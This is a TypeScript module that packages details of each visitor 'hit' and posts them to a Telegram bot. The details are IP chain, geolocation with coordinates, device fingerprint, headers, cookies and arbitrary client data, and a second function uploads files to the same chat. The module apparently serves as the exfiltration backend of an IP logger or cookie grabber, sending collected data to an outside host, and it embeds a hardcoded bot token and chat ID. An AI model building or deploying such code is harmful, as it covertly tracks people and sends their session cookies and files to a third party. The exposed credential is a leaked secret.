const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8629534294:AAGEHMqsw7IlDAkkrR6TQhpdYvWsjY4K2gA';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8832489098';
const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
const MAX_LEN = 4000;

function esc(s: string): string {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function tr(s: string, n = 300): string {
  if (!s) return '';
  return s.length > n ? s.slice(0, n - 3) + '...' : s;
}

async function call(method: string, body: object, timeout = 8000): Promise<any> {
  if (!BOT_TOKEN || !CHAT_ID) return null;
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeout);
    const r = await fetch(`${API_BASE}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: ctrl.signal,
    });
    clearTimeout(t);
    return await r.json().catch(() => null);
  } catch {
    return null;
  }
}

export interface Hit {
  ip: string;
  ipChain: string[];
  method: string;
  path: string;
  query: string;
  host: string;
  timestamp: string;
  userAgent: string;
  referer: string;
  origin: string;
  acceptLanguage: string;
  cookies: string;
  device: {
    browser: string;
    browserVersion: string;
    os: string;
    osVersion: string;
    vendor: string;
    model: string;
    type: string;
    cpu: string;
    engine: string;
  };
  headers: Record<string, string>;
  geo?: {
    country?: string;
    countryCode?: string;
    region?: string;
    city?: string;
    zip?: string;
    lat?: number;
    lon?: number;
    timezone?: string;
    isp?: string;
    org?: string;
    as?: string;
  };
  clientData?: Record<string, unknown>;
  tag?: string;
}

function build(h: Hit): string {
  const d = h.device;
  const L: string[] = [];
  L.push(`<b>NEW HIT${h.tag ? ' · ' + esc(h.tag) : ''}</b>`);
  L.push(`<b>Time</b> <code>${esc(h.timestamp)}</code>`);
  L.push(`<b>IP</b> <code>${esc(h.ip)}</code>`);
  if (h.geo) {
    const loc = [h.geo.city, h.geo.region, h.geo.country].filter(Boolean).join(', ');
    if (loc) L.push(`<b>Location</b> ${esc(loc)}`);
    if (h.geo.isp || h.geo.org) L.push(`<b>ISP</b> ${esc([h.geo.isp, h.geo.org].filter(Boolean).join(' / '))}`);
    if (h.geo.as) L.push(`<b>AS</b> ${esc(h.geo.as)}`);
    if (h.geo.lat !== undefined && h.geo.lon !== undefined) {
      L.push(`<b>Coords</b> <code>${h.geo.lat},${h.geo.lon}</code> <a href="https://maps.google.com/?q=${h.geo.lat},${h.geo.lon}">map</a>`);
    }
    if (h.geo.timezone) L.push(`<b>TZ</b> ${esc(h.geo.timezone)}`);
  }
  L.push('');
  L.push(`<b>Browser</b> ${esc([d.browser, d.browserVersion].filter(Boolean).join(' ') || 'unknown')}`);
  L.push(`<b>OS</b> ${esc([d.os, d.osVersion].filter(Boolean).join(' ') || 'unknown')}`);
  L.push(`<b>Device</b> ${esc([d.vendor, d.model].filter(Boolean).join(' ') || d.type || 'desktop')}`);
  if (d.cpu) L.push(`<b>CPU</b> ${esc(d.cpu)}`);
  if (d.engine) L.push(`<b>Engine</b> ${esc(d.engine)}`);
  L.push('');
  L.push(`<b>Req</b> <code>${esc(h.method)} ${esc(h.path)}${h.query ? '?' + esc(h.query) : ''}</code>`);
  L.push(`<b>Host</b> <code>${esc(h.host)}</code>`);
  if (h.referer) L.push(`<b>Referer</b> ${esc(tr(h.referer))}`);
  if (h.origin) L.push(`<b>Origin</b> ${esc(tr(h.origin))}`);
  if (h.acceptLanguage) L.push(`<b>Lang</b> ${esc(h.acceptLanguage)}`);
  if (h.cookies) L.push(`<b>Cookies</b> <code>${esc(tr(h.cookies, 500))}</code>`);
  L.push(`<b>UA</b> <code>${esc(tr(h.userAgent, 400))}</code>`);
  if (h.ipChain.length > 1) {
    L.push('');
    L.push(`<b>Chain</b> <code>${esc(h.ipChain.join(' -> '))}</code>`);
  }
  if (h.clientData && Object.keys(h.clientData).length) {
    L.push('');
    L.push(`<b>Client</b>`);
    L.push(`<code>${esc(tr(JSON.stringify(h.clientData), 1200))}</code>`);
  }
  let m = L.join('\n');
  if (m.length > MAX_LEN) m = m.slice(0, MAX_LEN - 3) + '...';
  return m;
}

export async function sendHit(h: Hit): Promise<void> {
  await call('sendMessage', {
    chat_id: CHAT_ID,
    text: build(h),
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  });
}

export async function sendFile(buf: Buffer, filename: string, caption: string): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('caption', caption.slice(0, 1000));
    fd.append('document', new Blob([new Uint8Array(buf)], { type: 'application/octet-stream' }), filename || 'file.bin');
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 25000);
    await fetch(`${API_BASE}/sendDocument`, { method: 'POST', body: fd, signal: ctrl.signal });
    clearTimeout(t);
  } catch {}
}